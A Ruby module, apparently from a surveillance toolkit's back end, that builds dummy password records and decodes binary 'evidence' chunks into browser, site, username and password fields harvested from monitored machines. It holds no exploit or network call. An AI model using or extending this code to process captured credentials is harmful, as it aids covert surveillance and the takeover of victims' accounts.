require 'rcs-common/evidence/common'

module RCS

module PasswordEvidence

  ELEM_DELIMITER = 0xABADC0DE

  def content
    resource = ["MSN", "IExplorer", "Firefox"].sample.to_utf16le_binary_null
    service = ["http://login.live.com", "http://www.google.com", "http://msn.live.it"].sample.to_utf16le_binary_null
    user = ["ALoR", "test", "daniel", "naga"].sample.to_utf16le_binary_null
    pass = ["secret", "mario1", "ht123456"].sample.to_utf16le_binary_null
    content = StringIO.new
    content.write resource
    content.write user
    content.write pass
    content.write service
    content.write [ ELEM_DELIMITER ].pack('L')

    content.string
  end
  
  def generate_content
    ret = Array.new
    10.rand_times { ret << content() }
    ret
  end
  
  def decode_content
    stream = StringIO.new @info[:chunks].join

    evidences = Array.new
    until stream.eof?
      @info[:resource] = ''
      @info[:service] = ''
      @info[:user] = ''
      @info[:pass] = ''

      resource = stream.read_utf16le_string
      @info[:resource] = resource.utf16le_to_utf8 unless resource.nil?
      user = stream.read_utf16le_string
      @info[:user] = user.utf16le_to_utf8 unless user.nil?
      pass = stream.read_utf16le_string
      @info[:pass] = pass.utf16le_to_utf8 unless pass.nil?
      service = stream.read_utf16le_string
      @info[:service] = service.utf16le_to_utf8 unless service.nil?

      delim = stream.read(4).unpack("L*").first
      raise EvidenceDeserializeError.new("Malformed PASSWORD (missing delimiter)") unless delim == ELEM_DELIMITER

      # this is not the real clone! redefined clone ...
      evidences << self.clone
    end
    
    return evidences
  end
end

end # ::RCS